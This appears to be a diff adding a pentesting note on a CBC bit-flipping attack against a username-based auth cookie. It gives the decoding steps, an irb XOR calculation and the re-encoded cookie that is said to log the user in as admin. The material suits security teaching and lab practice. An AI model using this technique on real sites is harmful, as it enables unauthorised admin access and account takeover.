@@ -1,0 +1,38 @@
+Auth uses CBC encryption
+
+	if the cookie is based off of the user name. i.e.:
+	You want to login as admin but don't have the password.
+	Create an account called xdmin
+
+	Cookie: auth=nljD5Qzpi35dXUrSgnY4%2BKlpTTCwqj4C
+
+	Send to cookie value to decoder, URL decode it:
+		nljD5Qzpi35dXUrSgnY4+KlpTTCwqj4C
+
+	Base64 decode it:
+		9e 58 c3 e5 0c e9 8b 7e	   5d 5d 4a d2 82 76 38 f8   XÃåé ~]]JÒ v8ø
+		a9 69 4d 30 b0 aa 3e 02	   -- -- -- -- -- -- -- --   ©iM0°ª>
+
+	Go into irb	-interactive ruby shell
+	irb
+		(main) 001:0> 0x9e^'a'.ord^'x'.ord	#0x9e is the current hex value of the first CBC block
+							#we want to change it to the letter 'a' when it is currently 'x'
+		==> 135					#value returned is decimal, needs to be hex
+		(main) 002:0> "%2x" % 135		#convert value to hex
+		==> "87"
+
+	Back in burp decoder:
+	Change the first block to the new value "87"
+		87 58 c3 e5 0c e9 8b 7e	   5d 5d 4a d2 82 76 38 f8   XÃåé ~]]JÒ v8ø
+		a9 69 4d 30 b0 aa 3e 02	   -- -- -- -- -- -- -- --   ©iM0°ª>
+
+	Base64 encode the new value:
+		h1jD5Qzpi35dXUrSgnY4+KlpTTCwqj4C
+
+		notice the difference between it and the original. The first 2 characaters
+		nl is now h1; also need to make sure the "+" sign is URL encoded %2B
+
+		h1jD5Qzpi35dXUrSgnY4%2BKlpTTCwqj4C
+
+	Now replace the auth cookie to the new value and you will be logged in as admin.
+
